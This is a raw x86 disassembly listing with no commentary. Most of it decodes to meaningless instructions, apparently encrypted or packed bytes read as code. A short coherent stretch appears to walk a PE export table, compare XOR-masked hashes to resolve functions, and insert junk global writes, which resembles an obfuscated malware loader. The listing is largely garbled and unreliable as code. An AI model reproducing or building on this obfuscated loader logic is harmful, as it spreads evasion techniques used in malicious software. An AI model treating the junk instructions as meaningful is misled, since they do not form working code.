  4047d3:	out    dx,eax
  4047d4:	pop    ebp
  4047d5:	jmp    0x31e2471c
  4047da:	sbb    al,0x7a
  4047dc:	enter  0x4629,0x86
  4047e0:	mov    ds:0xf82f5bef,al
  4047e5:	push   esp
  4047e6:	dec    eax
  4047e7:	fmul   DWORD PTR [edx+0x358a3927]
  4047ed:	test   esi,eax
  4047ef:	fs adc eax,0x23aec8aa
  4047f5:	pop    esp
  4047f6:	jb     0x40483f
  4047f8:	xchg   esi,eax
  4047f9:	ins    BYTE PTR es:[edi],dx
  4047fa:	push   es
  4047fb:	das    
  4047fc:	sbb    BYTE PTR [ecx+0x363c4f20],cl
  404802:	dec    edi
  404803:	fmul   st(7),st
  404805:	fdiv   st(2),st
  404807:	fst    DWORD PTR [ecx+eax*2+0x661fb654]
  40480e:	dec    ecx
  404810:	fild   DWORD PTR [ebx+esi*1]
  404813:	pop    ebx
  404814:	dec    esi
  404815:	test   ch,bl
  404817:	fnstsw WORD PTR [ecx+0x52cb1297]
  40481d:	aas    
  40481e:	push   es
  40481f:	or     bl,BYTE PTR [esi-0x80]
  404822:	lods   eax,DWORD PTR ds:[esi]
  404823:	retf   
  404824:	jne    0x4047b6
  404826:	jp     0x4047e3
  404828:	push   edx
  404829:	xchg   ecx,eax
  40482a:	mov    WORD PTR [esi+0x5794885b],gs
  404830:	mov    al,0x12
  404832:	fcomp  st(0)
  404834:	icebp  
  404835:	or     eax,0xe9f09d6d
  40483a:	pop    ebp
  40483b:	mov    al,ds:0x3c28a986
  404840:	xchg   BYTE PTR [ebx+edi*2-0x5f31bf3],ch
  404847:	add    edi,DWORD PTR [edx+0x78e4c0c8]
  40484d:	xchg   edx,eax
  40484e:	mov    dh,BYTE PTR [esi]
  404850:	fnstsw ax
  404852:	sbb    DWORD PTR [ecx+0x4e89760e],edi
  404858:	call   0x718bfc9c
  40485d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40485e:	sbb    DWORD PTR [edi],edx
  404860:	pusha  
  404861:	push   eax
  404862:	rcl    dl,1
  404864:	mov    ebx,0x4d82834
  404869:	iret   
  40486a:	push   es
  40486b:	inc    ebp
  40486c:	pop    ebx
  40486d:	cdq    
  40486e:	test   BYTE PTR [edi-0x28f44640],0xa0
  404875:	sub    dl,ch
  404877:	mov    al,ds:0x30d19067
  40487c:	mov    ecx,0x1af85e0f
  404881:	push   0xa0f59a74
  404886:	inc    esi
  404887:	fistp  QWORD PTR [bx+0x5e]
  40488b:	jno    0x404834
  40488d:	pop    ss
  40488e:	push   0xadb35088
  404893:	mov    ecx,0x14e2b22c
  404898:	mov    DWORD PTR [ebp-0x59e625af],ecx
  40489e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40489f:	and    cl,0xa9
  4048a2:	arpl   WORD PTR [esi-0x62],ax
  4048a5:	(bad)  
  4048a6:	aad    0x36
  4048a8:	sbb    cl,BYTE PTR [edi+0x13]
  4048ab:	mov    dl,BYTE PTR [edi]
  4048ad:	xor    eax,0xbcfe7d70
  4048b2:	pop    eax
  4048b3:	add    dl,al
  4048b5:	push   esi
  4048b6:	jle    0x40487e
  4048b8:	inc    ecx
  4048b9:	lea    ebx,ds:0x521cfd9e
  4048bf:	cdq    
  4048c0:	mov    cs,esp
  4048c2:	fwait
  4048c3:	sub    DWORD PTR [ecx+edi*2+0x188f2012],edi
  4048ca:	pushf  
  4048cb:	and    DWORD PTR [ebx+0x4c],ebp
  4048ce:	inc    eax
  4048cf:	jmp    0x4048f4
  4048d1:	aas    
  4048d2:	test   al,0xb4
  4048d4:	std    
  4048d5:	in     al,0x9a
  4048d7:	adc    al,0x53
  4048d9:	or     ch,BYTE PTR [ebp+0x47]
  4048dc:	inc    esp
  4048dd:	mov    fs,WORD PTR [ebp+0x4ad1d4d6]
  4048e3:	ret    0xf8d9
  4048e6:	aas    
  4048e7:	add    DWORD PTR [ebx],ecx
  4048e9:	pop    ds
  4048ea:	fist   WORD PTR [ecx]
  4048ec:	sbb    eax,0xd0ed0396
  4048f1:	std    
  4048f2:	outs   dx,DWORD PTR ds:[esi]
  4048f3:	arpl   WORD PTR [esi-0x18],cx
  4048f6:	fisub  DWORD PTR [esi]
  4048f8:	out    0x53,al
  4048fa:	out    0xb,al
  4048fc:	jge    0x404931
  4048fe:	mov    BYTE PTR [ecx+0x1a353d71],dl
  404904:	add    ebx,ebp
  404906:	ja     0x404939
  404908:	fbstp  TBYTE PTR [ebx+eiz*8-0x521427c5]
  40490f:	and    al,0x8
  404911:	sub    al,0x62
  404913:	push   0xf902de00
  404918:	add    cl,BYTE PTR [ebx-0x42bab1e0]
  40491e:	add    eax,0x936cbbac
  404923:	mov    BYTE PTR [ebp+0x220a9a55],bh
  404929:	inc    ebp
  40492a:	pushf  
  40492b:	pop    ds
  40492c:	or     eax,0xdd106e16
  404931:	fisttp DWORD PTR [eax+0x7f34018c]
  404937:	inc    edx
  404938:	aaa    
  404939:	pop    edx
  40493a:	jp     0x4048d0
  40493c:	in     eax,0x25
  40493e:	retf   
  40493f:	lock out dx,al
  404941:	test   ah,al
  404943:	cmp    BYTE PTR [ebp-0x3f],dh
  404946:	sub    bl,BYTE PTR [eax-0x51]
  404949:	sar    BYTE PTR [ecx+0x1dc41046],cl
  40494f:	imul   esp,DWORD PTR [ecx+0x5ef3c6dc],0x25
  404956:	fnstcw WORD PTR [ebp-0x686173a6]
  40495c:	dec    esi
  40495d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40495e:	add    eax,0xf39b4de6
  404963:	ins    BYTE PTR es:[edi],dx
  404964:	leave  
  404965:	mov    ah,0xaa
  404967:	push   0x10769442
  40496c:	jmp    0x50deb666
  404971:	xor    BYTE PTR [esi+0x61352aca],ah
  404977:	dec    edi
  404978:	loopne 0x404927
  40497a:	stos   DWORD PTR es:[edi],eax
  40497b:	sub    esi,DWORD PTR [edx]
  40497d:	lods   al,BYTE PTR ds:[esi]
  40497e:	lods   al,BYTE PTR ds:[esi]
  40497f:	sub    edx,0xffffffbb
  404982:	sbb    DWORD PTR ds:0x268e47c0,ebx
  404988:	jmp    0x96b5:0x817465a4
  40498f:	jb     0x4049ab
  404991:	push   0x5b
  404993:	jl     0x404995
  404995:	lock out 0xe4,al
  404998:	(bad)  
  404999:	cli    
  40499a:	iret   
  40499b:	jns    0x404953
  40499d:	adc    ebx,esi
  40499f:	pop    ebx
  4049a0:	add    edi,ebp
  4049a2:	and    al,0x76
  4049a4:	and    bh,BYTE PTR [ebp+ebx*1+0xe9d836b]
  4049ab:	adc    al,BYTE PTR [esi+0x4b84f91e]
  4049b1:	int3   
  4049b2:	into   
  4049b3:	arpl   WORD PTR [ecx+0x623427d2],cx
  4049b9:	inc    esi
  4049ba:	mov    eax,ds:0xc041b79
  4049bf:	sbb    al,al
  4049c1:	popf   
  4049c2:	in     al,dx
  4049c3:	pop    es
  4049c4:	fs fsub st,st(5)
  4049c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049c8:	mov    DWORD PTR [edx-0x52],ebx
  4049cb:	mov    ebp,0x18e95d83
  4049d0:	push   edi
  4049d1:	adc    ecx,0x1d015b31
  4049d7:	mov    bh,BYTE PTR [eax+0x37]
  4049da:	popa   
  4049db:	mov    eax,0x6ddfb980
  4049e0:	fs jmp 0xaa17fa4e
  4049e6:	xchg   edi,eax
  4049e7:	js     0x4049bc
  4049e9:	or     eax,0xecabf908
  4049ee:	aaa    
  4049ef:	mov    eax,ds:0x60894bc0
  4049f4:	inc    BYTE PTR [ebx+0x0]
  4049f7:	sbb    BYTE PTR [ecx+0x52],al
  4049fa:	iret   
  4049fb:	push   eax
  4049fc:	jle    0x4049a7
  4049fe:	mov    BYTE PTR [ebp-0x46d554c4],cl
  404a04:	jg     0x4049db
  404a06:	dec    eax
  404a07:	xchg   DWORD PTR [ecx-0x24e88f51],esi
  404a0d:	xchg   esp,eax
  404a0e:	enter  0xcf0f,0x6e
  404a12:	ins    BYTE PTR es:[edi],dx
  404a13:	test   eax,0x5802bf34
  404a18:	ror    BYTE PTR [ebp*8+0x637fecb5],cl
  404a1f:	cld    
  404a20:	mov    esi,0x481293e9
  404a25:	jecxz  0x404a01
  404a27:	fwait
  404a28:	xchg   ebx,eax
  404a29:	div    cl
  404a2b:	sti    
  404a2c:	scas   eax,DWORD PTR es:[edi]
  404a2d:	push   esi
  404a2e:	cld    
  404a2f:	jae    0x404aa5
  404a31:	bound  edx,QWORD PTR [eax]
  404a33:	and    edx,esp
  404a35:	dec    ebx
  404a36:	sub    al,0x59
  404a38:	inc    edi
  404a39:	mov    dh,0xf5
  404a3b:	push   0x23
  404a3d:	sbb    al,0x76
  404a3f:	push   0xc950f2cb
  404a44:	cmp    DWORD PTR [ebx],ebp
  404a46:	pushw  ds
  404a48:	shl    DWORD PTR [esi],1
  404a4a:	aaa    
  404a4b:	xchg   edi,eax
  404a4c:	nop
  404a4d:	sahf   
  404a4e:	stc    
  404a4f:	xchg   ebp,eax
  404a50:	lods   al,BYTE PTR ds:[esi]
  404a51:	loope  0x4049dc
  404a53:	fstp   DWORD PTR ds:0x1427c61b
  404a59:	dec    esi
  404a5a:	xchg   DWORD PTR [ebx-0x63],edx
  404a5d:	adc    eax,0x4b2ea737
  404a62:	sbb    BYTE PTR [eax+edx*1-0x22],bl
  404a66:	inc    edi
  404a67:	sar    DWORD PTR [ebx],0x8d
  404a6a:	mov    eax,es:0xf60670ed
  404a70:	cmp    al,0x69
  404a72:	iret   
  404a73:	lds    esp,FWORD PTR [edi-0x4d]
  404a76:	loope  0x404a98
  404a78:	test   DWORD PTR [ecx+0x3db36b91],0x7bdc2e5b
  404a82:	leave  
  404a83:	enter  0x76eb,0x7
  404a87:	push   ss
  404a88:	push   ebx
  404a89:	xchg   ecx,eax
  404a8a:	xor    eax,0xbb44763c
  404a8f:	dec    BYTE PTR [esi-0x5996c442]
  404a95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a96:	cmc    
  404a97:	mov    al,ds:0x47a18532
  404a9c:	push   ecx
  404a9d:	sti    
  404a9e:	pop    ebp
  404a9f:	jmp    0x404a5d
  404aa1:	xchg   DWORD PTR [ecx+edx*8+0x5cc72eca],ebx
  404aa8:	int3   
  404aa9:	mov    eax,ds:0x9d3cd13d
  404aae:	ds or  eax,0x9f1e4dc7
  404ab4:	into   
  404ab5:	adc    cl,BYTE PTR [esi-0x33]
  404ab8:	stc    
  404ab9:	mov    ebp,0xc43dc48f
  404abe:	ds mov dh,0xd8
  404ac1:	lock adc esp,DWORD PTR [edi-0xf4016f4]
  404ac8:	adc    al,0x6e
  404aca:	lea    edx,[ebx+ebx*1+0x3f]
  404ace:	ins    DWORD PTR es:[edi],dx
  404acf:	daa    
  404ad0:	(bad)  
  404ad1:	iret   
  404ad2:	add    dh,0x3e
  404ad5:	dec    esi
  404ad6:	fdivr  DWORD PTR [ecx+0x1d]
  404ad9:	fild   WORD PTR gs:[ecx-0x1e4a0270]
  404ae0:	sbb    al,0xa5
  404ae2:	push   ebx
  404ae3:	and    al,0xf1
  404ae5:	into   
  404ae6:	mov    edi,0x4b2c8543
  404aeb:	xchg   edx,eax
  404aec:	push   es
  404aed:	lds    ecx,FWORD PTR es:[edi]
  404af0:	jecxz  0x404b63
  404af2:	dec    eax
  404af3:	cld    
  404af4:	std    
  404af5:	(bad)  
  404af6:	les    ecx,FWORD PTR [ebx+eiz*4-0x5c]
  404afa:	fcomp  DWORD PTR [ebp+0x5]
  404afd:	ret    
  404afe:	in     al,dx
  404aff:	test   al,0x5f
  404b01:	mov    eax,0xfc986fd4
  404b06:	imul   ecx,DWORD PTR [ebx-0x66],0xffffffae
  404b0a:	mov    WORD PTR [edx+0x7b948dd2],gs
  404b10:	jg     0x404b66
  404b12:	ss jecxz 0x404a97
  404b15:	imul   ebx,DWORD PTR ds:0x5eeb29d4,0x157ad032
  404b1f:	(bad)  
  404b20:	jle    0x404b56
  404b22:	push   ebp
  404b23:	mov    ebx,0x33401218
  404b28:	loope  0x404ace
  404b2a:	pop    bp
  404b2c:	xor    DWORD PTR [ebx],edi
  404b2e:	xor    bh,BYTE PTR [esi]
  404b30:	aaa    
  404b31:	add    cl,BYTE PTR [edi]
  404b33:	cld    
  404b34:	repz dec esp
  404b36:	pop    ecx
  404b37:	js     0x404bb0
  404b39:	stc    
  404b3a:	push   ds
  404b3b:	or     eax,0x4e06ad5f
  404b40:	mov    ebp,0xf63833ae
  404b45:	test   BYTE PTR [eax-0x58],0xf6
  404b49:	jp     0x404b14
  404b4b:	(bad)  
  404b4c:	je     0x404b52
  404b4e:	leave  
  404b4f:	test   DWORD PTR [esi],esp
  404b51:	js     0x404b4c
  404b53:	sti    
  404b54:	mov    ss,WORD PTR [edi-0x6938ba49]
  404b5a:	jl     0x404b94
  404b5c:	and    ebp,DWORD PTR [ecx+0x5837559d]
  404b62:	mov    edi,0x730a8224
  404b67:	dec    eax
  404b68:	stos   BYTE PTR es:[edi],al
  404b69:	enter  0xc1e,0xd4
  404b6d:	shl    DWORD PTR [ebx+eax*8],1
  404b70:	iret   
  404b71:	push   cs
  404b72:	out    0x51,eax
  404b74:	jp     0x404b4b
  404b76:	push   edx
  404b77:	ret    0x95b2
  404b7a:	ds mov dl,0x19
  404b7d:	shl    al,cl
  404b7f:	(bad)  
  404b80:	mov    dh,0x9c
  404b82:	scas   al,BYTE PTR es:[edi]
  404b83:	dec    eax
  404b84:	aaa    
  404b85:	outs   dx,DWORD PTR ds:[esi]
  404b86:	add    DWORD PTR [ebp-0x2bfa7e86],ebx
  404b8c:	push   edx
  404b8d:	sbb    al,0x6f
  404b8f:	mov    al,ds:0xbbb485e6
  404b94:	pop    ebp
  404b95:	mov    al,ds:0xf204d6c
  404b9a:	push   esp
  404b9b:	sbb    eax,0x86623604
  404ba0:	add    edi,DWORD PTR [esi]
  404ba2:	retf   0x8c5f
  404ba5:	or     DWORD PTR [edx],ebp
  404ba7:	xchg   edx,eax
  404ba8:	inc    edi
  404ba9:	leave  
  404baa:	scas   eax,DWORD PTR es:[edi]
  404bab:	push   cs
  404bac:	sub    BYTE PTR [ebx-0x5b],ah
  404baf:	sub    ch,BYTE PTR [eax+0x6fa5b796]
  404bb5:	dec    esp
  404bb6:	stos   BYTE PTR es:[edi],al
  404bb7:	scas   al,BYTE PTR es:[edi]
  404bb8:	mov    ds:0x5f9f8dda,eax
  404bbd:	sub    edx,DWORD PTR [edi-0x57]
  404bc0:	push   0xdc4bb91c
  404bc5:	push   edx
  404bc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404bc7:	inc    eax
  404bc8:	pusha  
  404bc9:	xchg   edi,eax
  404bca:	mov    BYTE PTR [ecx],dl
  404bcc:	sti    
  404bcd:	fld    TBYTE PTR [ecx]
  404bcf:	(bad)  [ecx+0x74d92e3c]
  404bd5:	inc    edx
  404bd6:	shr    DWORD PTR [ecx+0x6adca415],1
  404bdc:	mov    bl,0x54
  404bde:	or     ch,BYTE PTR [ecx-0x4a271689]
  404be4:	xor    BYTE PTR [edi],bh
  404be6:	push   0x5464d71c
  404beb:	ins    BYTE PTR es:[edi],dx
  404bec:	les    ebp,FWORD PTR [ebx+0x6ff043cd]
  404bf2:	xchg   BYTE PTR [ebp-0x29],dl
  404bf5:	fcmove st,st(0)
  404bf7:	jecxz  0x404b96
  404bf9:	les    ebp,FWORD PTR [eax-0x30]
  404bfc:	sahf   
  404bfd:	and    eax,0x1095b11c
  404c02:	fnstenv [edi-0x4b]
  404c05:	popf   
  404c06:	lock scas eax,DWORD PTR es:[edi]
  404c08:	jp     0x404c6d
  404c0a:	add    eax,0xf4298b71
  404c0f:	pop    edx
  404c10:	lock fisttp DWORD PTR [edi+0x16692c95]
  404c17:	xchg   eax,eax
  404c19:	fcomp  QWORD PTR [edi-0x6b]
  404c1c:	dec    eax
  404c1d:	(bad)  
  404c1e:	mov    eax,ds:0xe3c8bba7
  404c23:	lock xor edx,DWORD PTR [esi-0x80]
  404c27:	xchg   DWORD PTR [ecx+0x1d],ebp
  404c2a:	mov    bh,0xf3
  404c2c:	loopne 0x404c20
  404c2e:	and    al,0x24
  404c30:	mov    esp,0x64d3dabc
  404c35:	jb     0x404caa
  404c37:	and    ecx,esp
  404c39:	shr    BYTE PTR [esi+0x499726d4],cl
  404c3f:	sub    bp,sp
  404c42:	pop    ss
  404c43:	pop    ds
  404c44:	jg     0x404c41
  404c46:	cmp    eax,0xefbc9a6f
  404c4b:	pop    ss
  404c4c:	repnz xlat BYTE PTR ds:[ebx]
  404c4e:	mov    edx,0xcbdeccf
  404c54:	and    esp,ecx
  404c56:	mov    eax,DWORD PTR [ebp-0x4]
  404c59:	mov    ecx,DWORD PTR [ebp-0x18]
  404c5c:	xor    eax,ebx
  404c5e:	add    eax,edi
  404c60:	cmp    ecx,eax
  404c62:	je     0x404e26
  404c68:	mov    eax,ds:0x422014
  404c6d:	sbb    DWORD PTR ds:0x420fb4,eax
  404c73:	mov    eax,DWORD PTR [ebp-0x18]
  404c76:	mov    eax,DWORD PTR [eax+0x18]
  404c79:	mov    DWORD PTR [ebp-0x24],eax
  404c7c:	dec    DWORD PTR ds:0x420fa4
  404c82:	mov    eax,DWORD PTR [ebp-0x18]
  404c85:	mov    ecx,DWORD PTR ds:0x420e7a
  404c8b:	xor    ecx,DWORD PTR ds:0x422010
  404c91:	mov    DWORD PTR ds:0x420e7a,ecx
  404c97:	mov    ecx,DWORD PTR [ebp+0x8]
  404c9a:	add    ecx,DWORD PTR [eax+0x20]
  404c9d:	mov    DWORD PTR [ebp-0x2c],ecx
  404ca0:	or     eax,DWORD PTR ds:0x420efc
  404ca6:	mov    eax,DWORD PTR [ebp-0x18]
  404ca9:	mov    ecx,DWORD PTR [ebp+0x8]
  404cac:	xor    DWORD PTR ds:0x420f70,0x420fa0
  404cb6:	add    ecx,DWORD PTR [eax+0x24]
  404cb9:	xor    eax,eax
  404cbb:	add    eax,DWORD PTR ds:0x420e96
  404cc1:	xor    DWORD PTR ds:0x422004,eax
  404cc7:	mov    DWORD PTR [ebp-0x34],ecx
  404cca:	mov    eax,DWORD PTR [ebp-0x18]
  404ccd:	mov    ecx,DWORD PTR [ebp+0x8]
  404cd0:	xor    DWORD PTR ds:0x422018,0x422010
  404cda:	add    ecx,DWORD PTR [eax+0x1c]
  404cdd:	mov    DWORD PTR ds:0x420ea2,ebx
  404ce3:	mov    eax,edi
  404ce5:	mov    DWORD PTR ds:0x420ef8,0x31e9
  404cef:	mov    DWORD PTR [ebp-0x18],ecx
  404cf2:	mov    DWORD PTR ds:0x422000,0x101a
  404cfc:	jmp    0x404dee
  404d01:	mov    DWORD PTR ds:0x420fb4,0x15
  404d0b:	cmp    DWORD PTR ds:0x420fb4,0x0
  404d12:	je     0x404d62
  404d18:	cmp    DWORD PTR ds:0x420fb4,0x8
  404d1f:	jne    0x404d34
  404d25:	push   DWORD PTR [ebp-0x24]
  404d28:	push   DWORD PTR [ebp-0x20]
  404d2b:	push   DWORD PTR [ebp-0x20]
  404d2e:	call   DWORD PTR ds:0x4247e1
  404d34:	cmp    DWORD PTR ds:0x420fb4,0x9
  404d3b:	jne    0x404d50
  404d41:	xor    edx,edx
  404d43:	add    edx,DWORD PTR ds:0x420fb4
  404d49:	dec    edx
  404d4a:	mov    DWORD PTR ds:0x420fb4,edx
  404d50:	mov    edx,DWORD PTR ds:0x420fb4
  404d56:	dec    edx
  404d57:	mov    DWORD PTR ds:0x420fb4,edx
  404d5d:	jmp    0x404d0b
  404d62:	mov    ecx,DWORD PTR [ebp-0x2c]
  404d65:	xor    edx,DWORD PTR ds:0x420e96
  404d6b:	mov    edx,DWORD PTR [ebp+0x8]
  404d6e:	add    DWORD PTR ds:0x420fb0,0x420f70
  404d78:	add    edx,DWORD PTR [ecx+esi*4]
  404d7b:	mov    DWORD PTR [ebp-0x28],edx
  404d7e:	movzx  ecx,BYTE PTR ds:0x420f00
  404d85:	or     DWORD PTR ds:0x420e7a,ecx
  404d8b:	mov    ecx,DWORD PTR [ebp-0x4]
  404d8e:	mov    edx,DWORD PTR [ebp-0x28]
  404d91:	adc    DWORD PTR ds:0x420fb4,0x420f00
  404d9b:	xor    ecx,ebx
  404d9d:	add    ecx,eax
  404d9f:	cmp    edx,ecx
  404da1:	mov    DWORD PTR ds:0x422000,0x2434
  404dab:	je     0x404dee
  404db1:	jmp    0x404dda
  404db6:	mov    ecx,DWORD PTR [ebp-0x4]
  404db9:	mov    edx,DWORD PTR [ebp-0x8]
  404dbc:	xor    ecx,ebx
  404dbe:	add    ecx,eax
  404dc0:	cmp    edx,ecx
  404dc2:	je     0x404e32
  404dc8:	mov    ecx,DWORD PTR [ebp-0x4]
  404dcb:	mov    edx,DWORD PTR [ebp-0x30]
  404dce:	xor    ecx,ebx
  404dd0:	add    ecx,eax
  404dd2:	cmp    edx,ecx
  404dd4:	je     0x404e41
  404dda:	lea    eax,[ebp-0x8]
  404ddd:	push   eax
  404dde:	push   DWORD PTR [ebp-0x28]
  404de1:	push   DWORD PTR [ebp+0xc]
  404de4:	call   0x410c6c
  404de9:	mov    eax,0x3272dd
  404dee:	mov    ecx,DWORD PTR [ebp-0x4]
  404df1:	mov    edx,DWORD PTR [ebp-0x8]
  404df4:	xor    ecx,ebx
  404df6:	add    ecx,eax
  404df8:	cmp    edx,ecx
  404dfa:	je     0x404e15
  404e00:	mov    ecx,DWORD PTR [ebp-0x34]
  404e03:	movzx  ecx,WORD PTR [ecx+esi*2]
  404e07:	mov    edx,DWORD PTR [ebp-0x18]
  404e0a:	mov    ecx,DWORD PTR [edx+ecx*4]
  404e0d:	mov    DWORD PTR [ebp-0x38],ecx
  404e10:	jmp    0x404db6
  404e15:	mov    ecx,DWORD PTR [ebp-0x14]
  404e18:	xor    ecx,ebx
  404e1a:	lea    esi,[esi+ecx*1+0x3272dd]
  404e21:	jmp    0x402787
  404e26:	mov    eax,DWORD PTR [ebp-0x4]
  404e29:	xor    eax,ebx
  404e2b:	add    eax,edi
  404e2d:	jmp    0x407332
  404e32:	mov    eax,DWORD PTR [ebp-0x4]
  404e35:	xor    eax,ebx
  404e37:	add    eax,0x3272dd
  404e3c:	jmp    0x407332
  404e41:	mov    ecx,DWORD PTR [ebp-0x38]
  404e44:	add    ecx,DWORD PTR [ebp+0x8]
  404e47:	mov    DWORD PTR [ebp-0x10],ecx
  404e4a:	mov    ecx,DWORD PTR [ebp-0x1c]
  404e4d:	test   ecx,ecx
  404e4f:	je     0x4072bd
  404e55:	mov    DWORD PTR [ebp-0x20],0x0
  404e5c:	push   0x3
  404e5e:	xor    edx,edx
  404e60:	pop    edx
  404e61:	add    edx,0x8
  404e64:	push   edx
  404e65:	pop    ecx
  404e66:	push   0x6
  404e68:	dec    ecx
  404e69:	pop    ebx
  404e6a:	dec    ebx
  404e6b:	xchg   ebx,ecx
  404e6d:	sub    ebx,ecx
  404e6f:	xchg   ebx,ecx
  404e71:	dec    ecx
  404e72:	mov    eax,DWORD PTR [ebp-0x1c]
  404e75:	imul   eax,ecx
  404e78:	sub    esp,eax
  404e7a:	mov    DWORD PTR [ebp-0x20],esp
  404e7d:	mov    eax,DWORD PTR [ebp-0x4]
  404e80:	mov    ecx,0x7510896
  404e85:	jmp    0x407212
  404e8a:	lock into 
  404e8c:	inc    esi
  404e8d:	push   cs
  404e8e:	mov    BYTE PTR [esi-0x8],dh
  404e91:	mov    al,0xbe
  404e93:	(bad)  
  404e94:	fs cld 
  404e96:	adc    al,BYTE PTR [eax+esi*1+0x7a5f0ac7]
  404e9d:	jp     0x404ea9
  404e9f:	pop    edi
  404ea0:	jp     0x404f1c
  404ea2:	popf   
  404ea3:	xchg   ebp,eax
  404ea4:	loope  0x404e3f
  404ea6:	sbb    bl,al
  404ea8:	call   0x6887:0x8f7818c2
  404eaf:	shl    BYTE PTR ds:0x6de76748,0xcc
  404eb6:	cwde   
  404eb7:	sbb    eax,0xdc8cdf2f
  404ebc:	and    al,0xc5
  404ebe:	mov    ecx,0x24eae039
  404ec3:	cmc    
  404ec4:	mov    cl,0x9
  404ec6:	pop    ds
  404ec7:	and    DWORD PTR [ebp-0x41],esi
  404eca:	lock adc ebp,DWORD PTR [ecx]
  404ecd:	adc    DWORD PTR [eax+0x25],ebx
  404ed0:	xor    esp,DWORD PTR [ebx-0x5b]
  404ed3:	jne    0x404ea9
  404ed5:	outs   dx,BYTE PTR ds:[esi]
  404ed6:	xchg   ecx,eax
  404ed7:	mov    bh,0x50
  404ed9:	(bad)  
  404eda:	lods   al,BYTE PTR ds:[esi]
  404edb:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  404edd:	dec    esi
  404ede:	dec    esp
  404edf:	push   esp
  404ee0:	pop    edi
  404ee1:	pop    ds
  404ee2:	sbb    cl,BYTE PTR [esi-0x20]
  404ee5:	mov    ?,WORD PTR [ebx]
  404ee7:	ror    DWORD PTR [edx+0x2],0xd7
  404eeb:	lods   eax,DWORD PTR ds:[esi]
  404eec:	data16 lahf 
  404eee:	sub    ecx,ecx
  404ef0:	add    DWORD PTR ds:0x2e5f9426,0xffffffc4
  404ef7:	push   edi
  404ef8:	xor    eax,0xaa1273c9
  404efd:	cmp    DWORD PTR [edi+0x2dc597],edx
  404f03:	sub    esi,edi
  404f05:	sub    ch,BYTE PTR [ebp-0x40]
  404f08:	xchg   ebx,eax
  404f09:	mov    ebx,0x4d8d3677
  404f0e:	sar    DWORD PTR [ebp+0x74],1
  404f11:	jmp    0xa7014005
  404f16:	push   ds
  404f17:	sub    ch,bl
  404f19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404f1a:	adc    DWORD PTR [eax*1+0x466da470],ecx
  404f21:	dec    ebx
  404f22:	fs mov dl,0xed
  404f25:	shl    DWORD PTR [eax-0x6a],0x22
  404f29:	push   esi
  404f2a:	sbb    al,0x6e
  404f2c:	inc    edx
  404f2d:	in     al,dx
  404f2e:	lds    ebx,FWORD PTR [ebx-0x1766f23b]
  404f34:	(bad)  [ebx]
  404f36:	ja     0x404f38
  404f38:	out    dx,eax
  404f39:	lock and dh,al
  404f3c:	retf   0x3233
  404f3f:	jns    0x404f1d
  404f41:	or     ecx,edi
  404f43:	sub    al,0x50
  404f45:	xchg   ebp,eax
  404f46:	dec    ebp
  404f47:	stos   BYTE PTR es:[edi],al
  404f48:	add    al,0xd4
  404f4a:	dec    ecx
  404f4b:	cmp    al,0x97
  404f4d:	mov    DWORD PTR [esi-0x6],esi
  404f50:	icebp  
  404f51:	out    dx,al
  404f52:	sub    eax,DWORD PTR [edi-0x5]
  404f55:	sub    dl,BYTE PTR [edx+0x28]
  404f58:	jg     0x404f37
  404f5a:	xchg   esp,eax
  404f5b:	mov    eax,ds:0xdf37ee3a
  404f60:	(bad)  
  404f61:	dec    esi
  404f62:	(bad)  
  404f63:	sbb    eax,0xbd27e811
  404f68:	push   cs
  404f69:	retf   
  404f6a:	mov    al,ds:0x3f8172f3
  404f6f:	int3   
  404f70:	int    0x27
  404f72:	fldpi  
  404f74:	rcr    BYTE PTR [ecx+0x2b86eb29],1
  404f7a:	enter  0x11a8,0x0
  404f7e:	fstp   TBYTE PTR [edi]
  404f80:	(bad)
  404f84:	jns    0x404fb7
  404f86:	daa    
  404f87:	adc    DWORD PTR [ecx],edi
  404f89:	mov    al,ds:0x549dbf8f
  404f8e:	outs   dx,DWORD PTR ds:[esi]
  404f8f:	jl     0x404f99
  404f91:	xor    al,0x84
  404f93:	mov    al,0x1a
  404f95:	and    al,0xea
  404f97:	ds adc esp,ebp
  404f9a:	push   ss
  404f9b:	inc    edx
  404f9c:	sub    eax,0xd0157bb4
  404fa1:	xor    bl,BYTE PTR ds:0x1228162e
  404fa7:	pop    ecx
  404fa8:	aas    
  404fa9:	sub    ch,0x48
  404fac:	mov    eax,ds:0x57b0498e
  404fb1:	aam    0x6e
  404fb3:	and    dh,dh
  404fb5:	mov    cl,0x1a
  404fb7:	dec    ebp
  404fb8:	fdivr  DWORD PTR [edi-0x4]
  404fbb:	add    al,0x27
  404fbd:	jmp    0x9ab9:0x7ff9be3b
  404fc4:	addr16 (bad) 
  404fc6:	repnz sbb esi,esi
  404fc9:	pop    ecx
  404fca:	mov    ebx,0x4e16f71d
  404fcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404fd0:	cwde   
  404fd1:	cdq    
  404fd2:	or     eax,0x66718f07
  404fd7:	ja     0x40503b
  404fd9:	aas    
  404fda:	inc    ebp
  404fdb:	mov    dh,ah
  404fdd:	push   ecx
  404fde:	pusha  
  404fdf:	aam    0xb8
  404fe1:	jae    0x404fc2
  404fe3:	pushf  
  404fe4:	inc    esp
  404fe5:	jae    0x404f87
  404fe7:	lahf   
  404fe8:	mov    dh,0x8
  404fea:	lods   al,BYTE PTR ds:[esi]
  404feb:	sub    eax,0xcdbe8d86
  404ff0:	and    dh,bl
  404ff2:	pop    eax
  404ff3:	popf   
  404ff4:	loope  0x404f7d
  404ff6:	rol    DWORD PTR [edi+0x3af68fd5],0x1c
  404ffd:	fs pop esp
  404fff:	mov    ds:0xe14e3bd9,al
  405004:	pop    esi
  405005:	inc    edx
  405006:	outs   dx,BYTE PTR ds:[esi]
  405007:	push   0x3b
  405009:	aam    0x30
  40500b:	sbb    ecx,DWORD PTR [ecx-0x4c]
  40500e:	xchg   DWORD PTR [ebp-0x1e],eax
  405011:	add    al,0xb
  405013:	js     0x40501a
  405015:	jmp    0x5ac3d11a
  40501a:	xor    DWORD PTR [ebx],ebp
  40501c:	mov    edi,0x33f436de
  405021:	dec    ebp
  405022:	sbb    eax,0xd791eb5e
  405027:	gs jns 0x405023
